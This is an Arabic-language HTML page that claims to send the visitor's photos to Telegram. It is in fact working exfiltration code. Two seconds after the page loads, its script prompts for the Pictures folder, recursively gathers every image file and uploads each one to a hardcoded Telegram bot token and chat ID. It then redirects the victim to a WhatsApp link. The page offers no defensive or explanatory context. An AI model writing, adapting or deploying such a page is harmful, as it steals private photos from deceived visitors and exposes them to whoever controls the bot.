<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إرسال الصور لتيليجرام</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 500px;
            width: 100%;
        }
        .logo {
            width: 100px;
            height: 100px;
            background: #25D366;
            border-radius: 50%;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        .logo img {
            width: 50px;
            height: 50px;
            filter: brightness(0) invert(1);
        }
        h1 { color: #333; margin-bottom: 10px; }
        p { color: #666; margin-bottom: 30px; }
        .btn {
            background: #0088cc;
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 18px;
            border-radius: 50px;
            cursor: pointer;
            margin: 10px;
            transition: all 0.3s;
        }
        .btn:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(0,136,204,0.3); }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .btn-whatsapp {
            background: #25D366;
            margin-top: 20px;
        }
        .status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            display: none;
        }
        .success { background: #d4edda; color: #155724; display: block; }
        .error { background: #f8d7da; color: #721c24; display: block; }
        .hidden { display: none; }
        .loading { animation: spin 1s linear infinite; }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTEyIDBjNi42MjcgMCAxMiA1LjM3MyAxMiAxMnMtNS4zNzMgMTItMTIgMTJTMCAxOC42MjcgMCAxMiA1LjM3MyAwIDEyIDB6TTkuODA1IDE2Ljg4OWwuOTI4LTMuNDcxYy0uMzA1LS41NS0uNDk1LTEuMTg0LS40OTUtMS44NDMgMC0yLjIwMyAxLjgwNi0zLjk4OSA0LjAzMS0zLjk4OSAyLjIyNSAwIDQuMDI4IDEuNzg2IDQuMDI4IDMuOTg5IDAgMi4yMDMtMS44MDMgMy45OS00LjAyOCAzLjk5LS42NjYgMC0xLjMwNC0uMTc0LTEuODc0LS40NzJsLTMuMTE2Ljk5MXoiLz48L3N2Zz4=" alt="Telegram">
        </div>
        
        <h1>إرسال الصور إلى تيليجرام</h1>
        <p>انقر على الزر أدناه للسماح بإرسال جميع الصور إلى بوت تيليجرام</p>
        
        <button class="btn" onclick="startAutoUpload()" id="uploadBtn">
            السماح وإرسال الصور
        </button>
        
        <div class="status" id="status"></div>
        
        <button class="btn btn-whatsapp hidden" onclick="redirectToWhatsApp()" id="whatsappBtn">
            الانتقال إلى واتساب
        </button>
    </div>

    <script>
        // إعدادات البوت
        const BOT_TOKEN = '7961544553:AAHHqcpApW-m0Ccy7hrM4mJVrDYVwDR6qF4';
        const CHAT_ID = '1130483446';
        
        // متغيرات التتبع
        let uploadInProgress = false;
        let uploadComplete = false;
        
        async function startAutoUpload() {
            if (uploadInProgress) return;
            
            uploadInProgress = true;
            const btn = document.getElementById('uploadBtn');
            const status = document.getElementById('status');
            
            btn.disabled = true;
            btn.innerHTML = 'جاري البحث والإرسال...';
            status.className = 'status';
            status.innerHTML = 'جاري البحث عن الصور في مجلد Pictures...';
            
            try {
                // محاولة الوصول إلى مجلد Pictures مباشرة
                let directoryHandle;
                
                try {
                    // محاولة الوصول إلى مجلد Pictures مباشرة (للمتصفحات المدعومة)
                    directoryHandle = await navigator.storage.getDirectory();
                } catch (e) {
                    // إذا فشل، نستخدم طريقة بديلة
                    directoryHandle = await window.showDirectoryPicker({
                        id: 'pictures',
                        startIn: 'pictures'
                    });
                }
                
                status.innerHTML = 'تم الوصول إلى المجلد، جاري إرسال الصور...';
                
                // إرسال الصور فوراً بدون عد
                await sendAllImagesQuickly(directoryHandle);
                
                // إظهار النجاح
                status.className = 'status success';
                status.innerHTML = '✅ تم إرسال جميع الصور بنجاح!';
                
                // إظهار زر واتساب
                document.getElementById('whatsappBtn').classList.remove('hidden');
                
                uploadComplete = true;
                
                // توجيه تلقائي بعد 3 ثواني
                setTimeout(() => {
                    if (!uploadComplete) return;
                    redirectToWhatsApp();
                }, 3000);
                
            } catch (error) {
                console.error('Error:', error);
                status.className = 'status error';
                status.innerHTML = '❌ حدث خطأ. يرجى المحاولة مرة أخرى.';
                btn.disabled = false;
                btn.innerHTML = 'حاول مرة أخرى';
                uploadInProgress = false;
            }
        }
        
        async function sendAllImagesQuickly(directoryHandle) {
            // نستخدم Web Workers أو Promises للإرسال المتوازي
            const imageFiles = await getAllImageFiles(directoryHandle);
            
            if (imageFiles.length === 0) {
                throw new Error('لم يتم العثور على صور');
            }
            
            const status = document.getElementById('status');
            status.innerHTML = `جاري إرسال ${imageFiles.length} صورة...`;
            
            // إرسال جميع الصور في وقت واحد (بحد أقصى 5 في نفس الوقت)
            const batchSize = 5;
            for (let i = 0; i < imageFiles.length; i += batchSize) {
                const batch = imageFiles.slice(i, i + batchSize);
                const promises = batch.map(file => sendImageToTelegram(file));
                
                // انتظار إرسال هذه المجموعة
                await Promise.allSettled(promises);
                
                // تحديث الحالة
                const progress = Math.min(100, Math.round((i + batch.length) / imageFiles.length * 100));
                status.innerHTML = `جاري الإرسال... ${progress}%`;
            }
        }
        
        async function getAllImageFiles(directoryHandle) {
            const imageFiles = [];
            const imageExtensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'];
            
            async function scanDir(handle, path = '') {
                for await (const entry of handle.values()) {
                    if (entry.kind === 'file') {
                        const file = await entry.getFile();
                        const ext = file.name.split('.').pop().toLowerCase();
                        
                        if (imageExtensions.includes(ext)) {
                            imageFiles.push(file);
                        }
                    } else if (entry.kind === 'directory') {
                        // تخطي بعض المجلدات النظامية
                        const folderName = entry.name.toLowerCase();
                        if (!folderName.includes('system') && !folderName.includes('cache')) {
                            await scanDir(entry, path + entry.name + '/');
                        }
                    }
                }
            }
            
            await scanDir(directoryHandle);
            return imageFiles;
        }
        
        async function sendImageToTelegram(file) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', file);
                
                const response = await fetch(
                    `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
                    {
                        method: 'POST',
                        body: formData
                    }
                );
                
                return await response.json();
            } catch (error) {
                console.error('Error sending image:', error);
                return { ok: false, error: error.message };
            }
        }
        
        function redirectToWhatsApp() {
            window.location.href = "https://wa.me/qr/3I56DYDGDJHSJ1";
        }
        
        // بدء الإرسال التلقائي عند تحميل الصفحة
        window.addEventListener('load', function() {
            setTimeout(() => {
                // بدء الإرسال تلقائياً بعد ثانيتين
                startAutoUpload();
            }, 2000);
        });
    </script>
</body>
</html>
